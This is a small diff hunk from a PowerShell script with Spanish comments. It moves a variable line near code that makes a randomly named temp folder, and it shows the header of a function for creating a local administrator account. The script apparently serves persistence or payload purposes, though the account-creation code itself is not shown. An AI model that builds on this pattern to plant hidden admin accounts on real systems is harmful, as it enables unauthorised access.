@@ -7,9 +7,10 @@ function random_text {
 
 #Variables 
 #Creamos carpeta con nombre aleatorio
+$initial_dir = $PWD.Path
 $wd = random_text
 $path = "$env:temp/$wd"
-$initial_dir = $PWD.Path
+
 
 #Creando administrador local
 function Create-NewLocalAdmin {
